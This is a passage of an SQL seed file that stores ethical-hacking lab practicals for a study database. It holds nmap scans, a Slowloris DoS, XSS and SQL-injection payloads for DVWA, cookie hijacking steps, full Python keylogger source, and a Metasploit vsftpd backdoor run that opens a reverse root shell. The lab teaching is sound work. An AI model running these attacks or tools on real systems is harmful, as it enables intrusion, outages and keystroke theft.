nmap -sF -T4 scanme.nmap.org

# 4. NULL Scan (-sN) does not set any bits (TCP flag header is 0)
nmap -sN -p 22 scanme.nmap.org

# 5. XMAS Scan (-sX) sets the FIN, PSH, and URG flags
nmap -sX -T4 scanme.nmap.org$code$,
    $orig$nmap -sA –T4 scanme.nmap.org
nmap –p22, 113, 139 scanme.nmap.org
nmap –sF-T4 para
nmap -sN –p 22 scanme.nmap.org
nmap –sN -p 22 scanme.nmap.org$orig$,
    $lang$Bash / Nmap$lang$,
    $out$Starting Nmap 7.991 ( https://nmap.org )
Nmap scan report for scanme.nmap.org (45.33.32.156)
Host is up (0.28s latency).
PORT   STATE          SERVICE
22/tcp open|filtered  ssh
Nmap done: 1 IP address (1 host up) scanned$out$,
    '[]'::jsonb,
    $json$["PART 1 — USE NMAP TO PERFORM AN ACK SCAN TO DETERMINE IF A PORT IS FILTERED, UNFILTERED, OR OPEN:","Step 1: In Zenmap / terminal, run command: `nmap -sA -T4 scanme.nmap.org`","PART 2 — PERFORM SYN, FIN, NULL, AND XMAS SCANS TO IDENTIFY OPEN PORTS AND THEIR CHARACTERISTICS:","Step 2 (SYN / Port scan): Run command: `nmap -p 22,113,139 scanme.nmap.org`","Step 3 (FIN Scan -sF, sets just TCP FIN bit): Run command: `nmap -sF -T4 scanme.nmap.org`","Step 4 (NULL Scan -sN, TCP flag header is 0): Run command: `nmap -sN -p 22 scanme.nmap.org`","Step 5 (XMAS Scan -sX, sets FIN, PSH, and URG flags): Run command: `nmap -sX -T4 scanme.nmap.org`"]$json$::jsonb,
    $json$["Conservative correction: replaced typographic en-dashes (–) with standard ASCII hyphens (-), removed spaces after commas in port lists (`22,113,139`), and matched Step 5 XMAS scan command (`nmap -sX -T4 scanme.nmap.org`) to the Zenmap screenshot on page 12."]$json$::jsonb,
    ARRAY[$item$nmap$item$, $item$zenmap$item$, $item$port scanning$item$, $item$ack scan$item$, $item$syn scan$item$, $item$fin scan$item$, $item$null scan$item$, $item$xmas scan$item$, $item$scanme.nmap.org$item$, $item$-sa$item$, $item$-sf$item$, $item$-sn$item$, $item$-sx$item$]::text[],
    ARRAY[$item$Ethical Hacking Practical 4$item$, $item$Nmap Port Scanning Commands$item$, $item$SYN FIN NULL XMAS Scan Nmap$item$]::text[],
    $pdf$final_ethical_hacking_607197eb.pdf$pdf$,
    ARRAY[1, 11, 12]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Ethical Hacking] Practical 5: Network Traffic Capture and DoS Attack with Wireshark and Slowloris (source_key: ethical-hacking-practical-5)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'b2000000-0000-4000-8000-000000000005',
    $skey$ethical-hacking-practical-5$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$ethical-hacking$s$),
    5,
    $title$Network Traffic Capture and DoS Attack with Wireshark and Slowloris$title$,
    $q$NETWORK TRAFFIC CAPTURE AND DOS ATTACK WITH WIRESHARK AND NEMESY$q$,
    $code$# Part 1: Launch Wireshark for HTTP packet capture
wireshark

# Part 2: Denial of Service (DoS) Attack using Slowloris
mkdir Slowloris
cd Slowloris
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
ifconfig
sudo service apache2 start
sudo service apache2 status
ls -l
python3 slowloris.py 192.168.152.128 -s 500$code$,
    $orig$wireshark
mkdir Slowloris
cd slowloris
git.clone https://github.com/gkbrk/slowloris.git
ifconfig
service apache 2 status
ls –l
python3 slowloris.py 192.168.152.128 -s 500$orig$,
    $lang$Bash / Kali Linux$lang$,
    $out$Part 1 (Wireshark): Live packet capture on eth0 filtered by 'http' and TCP stream inspection searching for 'password' / 'user'.
Part 2 (Slowloris DoS): Apache2 server on 192.168.152.128 flooded with 500 sockets; browser tab spins indefinitely unable to load http://192.168.152.128.$out$,
    '[]'::jsonb,
    $json$["PART 1 — NETWORK TRAFFIC CAPTURE WITH WIRESHARK:","Step 1: Open the Kali terminal, type `wireshark`, and press Enter.","Step 2: Wait for the Wireshark GUI interface to open.","Step 3: Select the `eth0` network interface and click the blue shark fin icon in the top-left corner to start capturing.","Step 4: Observe Wireshark capturing live network traffic.","Step 5: Open any HTTP website in the web browser and submit login credentials.","Step 6: In Wireshark, type `http` in the display filter bar and press Enter.","Step 7/8: Right-click an HTTP packet -> Follow -> TCP Stream, then use the Find bar to search for `password` or `user` and click Find Next.","PART 2 — DENIAL OF SERVICE (DOS) ATTACK WITH SLOWLORIS:","Step 1: Open the Kali Linux terminal.","Step 2: Create a directory named Slowloris using `mkdir Slowloris`.","Step 3: Move into the directory using `cd Slowloris`.","Step 4: Clone the Slowloris tool from GitHub: `git clone https://github.com/gkbrk/slowloris.git`.","Step 5 & 6: Check the machine IP address and network interface using `ifconfig` (e.g., 192.168.152.128).","Step 7: Start and check the Apache server status: `sudo service apache2 start` and `sudo service apache2 status`.","Step 8: List files using `ls -l`.","Step 9: Launch the Slowloris DoS attack: `python3 slowloris.py 192.168.152.128 -s 500`.","Step 10: Open the browser and navigate to `http://192.168.152.128`; observe the page continuously loading without opening."]$json$::jsonb,
    $json$["Conservative correction: fixed `git.clone` -> `git clone`, `service apache 2 status` -> `sudo service apache2 status`, and `ls –l` -> `ls -l` to match the terminal screenshots on pages 15-16."]$json$::jsonb,
    ARRAY[$item$wireshark$item$, $item$dos attack$item$, $item$denial of service$item$, $item$slowloris$item$, $item$nemesy$item$, $item$packet capture$item$, $item$tcp stream$item$, $item$apache2$item$]::text[],
    ARRAY[$item$Ethical Hacking Practical 5$item$, $item$Wireshark Packet Capture and Slowloris DoS Attack$item$]::text[],
    $pdf$final_ethical_hacking_607197eb.pdf$pdf$,
    ARRAY[1, 13, 14, 15, 16]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Ethical Hacking] Practical 6: Persistent Cross-Site Scripting (Stored XSS) Attack on DVWA (source_key: ethical-hacking-practical-6)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'b2000000-0000-4000-8000-000000000006',
    $skey$ethical-hacking-practical-6$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$ethical-hacking$s$),
    6,
    $title$Persistent Cross-Site Scripting (Stored XSS) Attack on DVWA$title$,
    $q$PERSISTENT CROSS-SITE SCRIPTING ATTACK$q$,
    $code$# Clone DVWA repository
sudo git clone https://github.com/digininja/DVWA.git

# Install XAMPP in Kali Linux
cd ~/Downloads
ls
chmod 777 xampp-linux-x64-8.1.25-0-installer.run
./xampp-linux-x64-8.1.25-0-installer.run

# Move DVWA into XAMPP htdocs and start LAMPP services
mv DVWA /opt/lampp/htdocs
cd /opt/lampp
./lampp start

# Stored XSS Test Payload for DVWA Guestbook (http://localhost/dvwa)
# <script>alert("Stored XSS")</script>$code$,
    $orig$sudo git clone https://github.com/digininja/DVWA.git
Downloads
ls
chmod 777* xampp-linux-x64-8.1.25.0-installer.run
./xampp-linux64-8.1.25-0-installer.run
mv dvwa /opt/lampp/htdocs
ed /opt/ampp
./lampp start$orig$,
    $lang$Bash / XSS$lang$,
    $out$Starting XAMPP for Linux 8.1.25-0...
XAMPP: Starting Apache... ok.
XAMPP: Starting MySQL... ok.
XAMPP: Starting ProFTPD... ok.
DVWA Guestbook executes stored message/script on every page reload.$out$,
    '[]'::jsonb,
    $json$["Step 1: Open the browser, search for DVWA GitHub, and open https://github.com/digininja/DVWA.git.","Step 2: Click on the \"Code\" button and copy the HTTPS clone URL.","Step 3: Open the Kali Linux terminal and run `sudo git clone https://github.com/digininja/DVWA.git`.","Step 4: Open the browser, search for XAMPP download, and download the Linux installer.","Step 5: In the terminal, go to the `Downloads` folder and run `ls` to verify the XAMPP installer file.","Step 6: Grant execute permissions: `chmod 777 xampp-linux-x64-8.1.25-0-installer.run`.","Step 7: Run the installer: `./xampp-linux-x64-8.1.25-0-installer.run` and complete the setup wizard.","Step 8: Move the cloned DVWA folder to XAMPP htdocs: `mv DVWA /opt/lampp/htdocs`.","Step 9: Navigate to `/opt/lampp` (`cd /opt/lampp`) and start the server using `./lampp start`.","Step 10: Open the browser and navigate to `http://localhost/dvwa` (or `http://127.0.0.1:42001`).","Step 11: Go to \"DVWA Security\", set the Security Level to \"Low\", and click Submit.","Step 12: Click on \"XSS (Stored)\" in the left navigation menu.","Step 13: Enter a name in the Name field, type a script/secret message in the Message field, and click \"Sign Guestbook\". The stored payload executes whenever the page is reloaded."]$json$::jsonb,
    $json$["Conservative correction: fixed PDF text typos `ed /opt/ampp` -> `cd /opt/lampp` and `mv dvwa` -> `mv DVWA` to match the terminal screenshots on pages 18-19."]$json$::jsonb,
    ARRAY[$item$xss$item$, $item$cross-site scripting$item$, $item$persistent xss$item$, $item$stored xss$item$, $item$dvwa$item$, $item$xampp$item$, $item$lampp$item$, $item$guestbook$item$]::text[],
    ARRAY[$item$Ethical Hacking Practical 6$item$, $item$Stored XSS Attack DVWA$item$, $item$Persistent Cross Site Scripting$item$]::text[],
    $pdf$final_ethical_hacking_607197eb.pdf$pdf$,
    ARRAY[1, 17, 18, 19, 20]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Ethical Hacking] Practical 7: Session Impersonation with Firefox, Tamper Data, and Cookie-Editor (source_key: ethical-hacking-practical-7)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'b2000000-0000-4000-8000-000000000007',
    $skey$ethical-hacking-practical-7$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$ethical-hacking$s$),
    7,
    $title$Session Impersonation with Firefox, Tamper Data, and Cookie-Editor$title$,
    $q$SESSION IMPERSONATION WITH FIREFOX AND TAMPER DATA$q$,
    $code$# Captured Session Cookie Example
PHPSESSID=6ktg3gfoeut6seh7gqi72aovaqup
# (or PHPSESSID=bd04d1748462014bfb261c47d2a7c6a7)

# Target Test Application URLs
http://www.techpanda.org/index.php
http://www.techpanda.org/dashboard.php$code$,
    $orig$PHPSESSID=bd04d1748462014bfb261c47d2a7c6a7$orig$,
    $lang$Web Security / Firefox Extensions$lang$,
    $out$Dashboard | Personal Contacts Manager v1.0 accessed directly via injected PHPSESSID cookie without re-authenticating.$out$,
    '[]'::jsonb,
    $json$["Step 1: Install and open Mozilla Firefox. Go to Add-ons (`about:addons`) and search for \"Tamper Data for FF Quantum\". Add the extension.","Step 2: Search for \"Cookie-Editor\" in Firefox Add-ons and install it.","Step 3: Open a new tab and navigate to `http://www.techpanda.org/`.","Step 4: Log into the Personal Contacts Manager using valid credentials.","Step 5: Click on the Cookie-Editor icon in the top-right corner and copy the `PHPSESSID` value.","Step 6: Open Firefox Settings -> Privacy & Security (`about:preferences#privacy`) and clear cookies and site data.","Step 7: Start the Tamper Data extension and click \"Yes\" to begin intercepting requests.","Step 8: Navigate to `http://www.techpanda.org/index.php` in Firefox.","Step 9: Paste the copied `PHPSESSID` session ID into Cookies (via Cookie-Editor / Tamper Data) and click OK.","Step 10: Inspect the intercepted HTTP GET/POST headers in Tamper Data.","Step 11: Navigate to `http://www.techpanda.org/dashboard.php` (written as Facebook.com/dashboard.php in PDF text) to automatically access the authenticated user dashboard via session impersonation."]$json$::jsonb,
    $json$["Note on source PDF page 24: Step 11 text mentions `https://www.Facebook.com/dashboard.php`, whereas the actual screenshot shows the `techpanda.org/dashboard.php` Personal Contacts Manager table."]$json$::jsonb,
    ARRAY[$item$session impersonation$item$, $item$session hijacking$item$, $item$tamper data$item$, $item$cookie editor$item$, $item$phpsessid$item$, $item$firefox$item$, $item$techpanda$item$]::text[],
    ARRAY[$item$Ethical Hacking Practical 7$item$, $item$Session Hijacking with Tamper Data and Cookie Editor$item$]::text[],
    $pdf$final_ethical_hacking_607197eb.pdf$pdf$,
    ARRAY[1, 21, 22, 23, 24]::integer[],
    $v$verified$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Ethical Hacking] Practical 8: SQL Injection Attack (DVWA) (source_key: ethical-hacking-practical-8)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'b2000000-0000-4000-8000-000000000008',
    $skey$ethical-hacking-practical-8$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$ethical-hacking$s$),
    8,
    $title$SQL Injection Attack (DVWA)$title$,
    $q$SQL INJECTION ATTACK$q$,
    $code$# Setup DVWA on XAMPP (Kali Linux)
sudo git clone https://github.com/digininja/DVWA.git
cd ~/Downloads
chmod 777 xampp-linux-x64-8.1.25-0-installer.run
./xampp-linux-x64-8.1.25-0-installer.run
mv DVWA /opt/lampp/htdocs
cd /opt/lampp
./lampp start

# SQL Injection Payloads (DVWA -> SQL Injection -> User ID box)
# Test 1: Normal input
1

# Test 2: Boolean expression
1=1

# Test 3: Authentication Bypass / Dump All Users SQLi Payload
1' OR '1'='1'#$code$,
    $orig$sudo git clone https://github.com/digininja/DVWA.git
chmod 777 * xampp- linux-x64-8.1.25-0-installer.run
./xampp- linux-x64-8.1.25-0-installer.run
mydvwa /opt/lampp/htdocs
ed /opt/lampp
lampp start
1
1=1
1°OR’1’=’1’#$orig$,
    $lang$SQL / Bash$lang$,
    $out$ID: 1' OR '1'='1'#
First name: admin | Surname: admin
First name: Gordon | Surname: Brown
First name: Hack | Surname: Me
First name: Pablo | Surname: Picasso
First name: Bob | Surname: Smith$out$,
    '[]'::jsonb,
    $json$["Steps 1-4: Clone DVWA from GitHub using `sudo git clone https://github.com/digininja/DVWA.git`.","Steps 5-8: Download XAMPP for Linux, navigate to `Downloads`, run `chmod 777 xampp-linux-x64-8.1.25-0-installer.run`, and execute `./xampp-linux-x64-8.1.25-0-installer.run`.","Steps 9-10: Move DVWA into XAMPP htdocs (`mv DVWA /opt/lampp/htdocs`), change directory (`cd /opt/lampp`), and start XAMPP (`./lampp start`).","Steps 11-12: Open `http://localhost/dvwa` in the browser, go to \"DVWA Security\", set Security Level to \"Low\", and click Submit.","Step 13: Click on the \"SQL Injection\" tab in the left sidebar.","Step 14: Enter `1` in the User ID text box and click Submit (returns admin record).","Step 15: Enter `1=1` in the User ID text box and click Submit.","Step 16: Enter `1' OR '1'='1'#` in the User ID text box and click Submit to dump all user records from the database."]$json$::jsonb,
    $json$["Conservative correction: fixed OCR typo `1°OR’1’=’1’#` -> `1' OR '1'='1'#` and `mydvwa` -> `mv DVWA` to match the screenshots on pages 27-29."]$json$::jsonb,
    ARRAY[$item$sql injection$item$, $item$sqli$item$, $item$dvwa$item$, $item$1' or '1'='1'#$item$, $item$1=1$item$, $item$database dump$item$, $item$xampp$item$]::text[],
    ARRAY[$item$Ethical Hacking Practical 8$item$, $item$SQL Injection Attack on DVWA$item$, $item$SQLi Practical$item$]::text[],
    $pdf$final_ethical_hacking_607197eb.pdf$pdf$,
    ARRAY[1, 25, 26, 27, 28, 29]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Ethical Hacking] Practical 9: Creating a Keylogger with Python (pynput) (source_key: ethical-hacking-practical-9)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'b2000000-0000-4000-8000-000000000009',
    $skey$ethical-hacking-practical-9$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$ethical-hacking$s$),
    9,
    $title$Creating a Keylogger with Python (pynput)$title$,
    $q$CREATING A KEYLOGGER WITH PYTHON$q$,
    $code$import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print("alphanumeric key {0} pressed".format(key.char))
    except AttributeError:
        print("Special key {0} pressed".format(key))

def write_file(keys):
    with open("key.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write(" ")

def on_release(key):
    print("{0} release".format(key))
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()$code$,
    $orig$import pynput
frompynput.keyboard import key,Listener
keys = [] defon_press(key):
keys.append(key) write_file(keys) try:
print("alphanumeric key {0} pressd".format(key.char)) except AttributeError:
print("Special key {0} pressd".format(key))
defwrite_file(keys): with open("key.txt","w") as f: for key in keys:
k= str(key).replace(""", "")
f.write(k)
f.write("") defon_release(key):
print("{0} release".format(key)) if key = key.ese:
return False with Listener (on_press=on_press,on_release=on_release) as listner:
listner,join()$orig$,
    $lang$Python$lang$,
    $out$codedwithajay Key.space Key.space patidar$out$,
    $json$["Install and import `Key` and `Listener` from `pynput.keyboard`.","Maintain a list `keys = []` to store captured keystrokes.","Define `on_press(key)` callback to append each key to `keys`, write to `key.txt`, and print whether an alphanumeric or special key was pressed.","Define `write_file(keys)` to open `key.txt` in write mode, strip single quotes from each key representation, and write them separated by spaces.","Define `on_release(key)` callback that stops the listener (`return False`) when `Key.esc` is pressed.","Start the keyboard `Listener(on_press=on_press, on_release=on_release)` and call `listener.join()`."]$json$::jsonb,
    $json$["Step 1: Open PyCharm or terminal and install pynput: `pip install pynput`","Step 2: Create `key_logger_first.py`, paste the keylogger code, and run it.","Step 3: Type sample text, press Esc to stop, and open `key.txt` to inspect the logged keys."]$json$::jsonb,
    $json$["Requirement: `pip install pynput`","Conservative correction applied: fixed PDF syntax errors (`frompynput` -> `from pynput`, `import key,Listener` -> `import Key, Listener`, `defon_press` -> `def on_press`, `if key = key.ese:` -> `if key == Key.esc:`, `listner,join()` -> `listener.join()`)."]$json$::jsonb,
    ARRAY[$item$keylogger$item$, $item$python keylogger$item$, $item$pynput$item$, $item$pynput.keyboard$item$, $item$listener$item$, $item$on_press$item$, $item$on_release$item$, $item$key.txt$item$]::text[],
    ARRAY[$item$Ethical Hacking Practical 9$item$, $item$Keylogger in Python using pynput$item$]::text[],
    $pdf$final_ethical_hacking_607197eb.pdf$pdf$,
    ARRAY[1, 30, 31]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Ethical Hacking] Practical 10: Exploiting with Metasploit (Kali Linux & Metasploitable2) (source_key: ethical-hacking-practical-10)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'b2000000-0000-4000-8000-000000000010',
    $skey$ethical-hacking-practical-10$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$ethical-hacking$s$),
    10,
    $title$Exploiting with Metasploit (Kali Linux & Metasploitable2)$title$,
    $q$EXPLOITING WITH METASPLOIT (KALI LINUX)$q$,
    $code$# 1. Discover target IP and scan open services from Kali Linux root terminal
sudo su
netdiscover
nmap -sV 192.168.247.136

# 2. Launch Metasploit Framework
msfconsole

# 3. Search and select FTP backdoor exploit module
search Backdoor Command Execution
use 3
# (Selects exploit/unix/ftp/proftpd_133c_backdoor or use exploit/unix/ftp/vsftpd_234_backdoor)

# 4. Configure module options and payload
show options
set RHOSTS 192.168.247.136
set payload cmd/unix/reverse
set LHOST 192.168.247.131
options

# 5. Execute exploit to gain root shell access
exploit
ls$code$,
    $orig$sudo su
netdiscover
nmap -sV 192.168. 152.128
msfconsole
search Backdoor Command Execution
use 3
show options
set RHOST 192.168.247.136
options
set payload cmd/unix/reverse
set LHOST 192.168.154.128
exploit$orig$,
    $lang$Bash / Metasploit$lang$,
    $out$[*] 192.168.247.136:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.247.136:21 - USER: 331 Please specify the password.
[+] 192.168.247.136:21 - Backdoor service has been spawned, handling...
[+] 192.168.247.136:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.20.204.144:46785 -> 192.168.247.136:6200)
ls
bin  boot  cdrom  dev  etc  home  initrd  lib  lost+found  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var  vmlinuz$out$,
    '[]'::jsonb,
    $json$["Steps 1-4: Download Metasploitable2 (`Metasploitable.vmx`) from SourceForge and open it in VMware Workstation.","Step 5: Log in to the Metasploitable2 VM using username `msfadmin` and password `msfadmin`.","Steps 6-8: Open Kali Linux terminal, run `sudo su`, and run `netdiscover` to identify the connected Metasploitable2 IP address (e.g., `192.168.247.136`).","Step 9: Verify the target IP address by opening `http://192.168.247.136` in Chrome to see the Metasploitable2 landing page.","Step 10: Run service version detection scan: `nmap -sV 192.168.247.136`.","Steps 11-13: Identify vulnerable FTP services (`ProFTPD 1.3.1` / `vsftpd 2.3.4`) and look up the Backdoor Command Execution module on Exploit-DB.","Step 14: Open Kali terminal and start Metasploit using `msfconsole`.","Step 15: Search for the exploit module: `search Backdoor Command Execution`.","Step 16: Select the exploit module using `use 3` (`exploit/unix/ftp/proftpd_133c_backdoor` or `exploit/unix/ftp/vsftpd_234_backdoor`).","Steps 17-18: View options with `show options`, set the target IP with `set RHOSTS 192.168.247.136`, and verify with `options`.","Step 19: Set the reverse shell payload: `set payload cmd/unix/reverse`.","Step 20: Set the attacker Kali Linux IP: `set LHOST 192.168.247.131`.","Step 21: Type `exploit` and press Enter to open a root shell on Metasploitable2, then run `ls` to verify access."]$json$::jsonb,
    $json$["Note: Steps 16-20 demonstrate configuring `exploit/unix/ftp/proftpd_133c_backdoor` while the output screenshot on page 38 displays the shell session from `exploit/unix/ftp/vsftpd_234_backdoor` against port 21."]$json$::jsonb,
    ARRAY[$item$metasploit$item$, $item$msfconsole$item$, $item$metasploitable$item$, $item$kali linux$item$, $item$proftpd$item$, $item$vsftpd$item$, $item$rhost$item$, $item$lhost$item$, $item$exploit$item$, $item$netdiscover$item$]::text[],
    ARRAY[$item$Ethical Hacking Practical 10$item$, $item$Metasploit Exploitation Practical$item$, $item$Exploiting Metasploitable2 with Kali Linux$item$]::text[],
    $pdf$final_ethical_hacking_607197eb.pdf$pdf$,
    ARRAY[1, 32, 33, 34, 35, 36, 37, 38]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Software Testing and Quality Assurance] Practical 1: Install Selenium IDE and Create a Test Suite (Minimum 4 Test Cases) (source_key: stqa-practical-1)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'c3000000-0000-4000-8000-000000000001',
    $skey$stqa-practical-1$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$stqa$s$),
    1,
    $title$Install Selenium IDE and Create a Test Suite (Minimum 4 Test Cases)$title$,
    $q$Install Selenium IDE and create a test suite containing a minimum of 4 test cases for different web page formats (e.g., HTML, XML, JSON, etc.).$q$,
    NULL,
    NULL,
    $lang$Selenium IDE$lang$,
    $out$Selenium IDE project "SQTA Prac1.side" containing 4 recorded test cases (Mercury Tours, youtube, Yahoo, Google) executing with "completed successfully" in the Log panel.$out$,
    '[]'::jsonb,
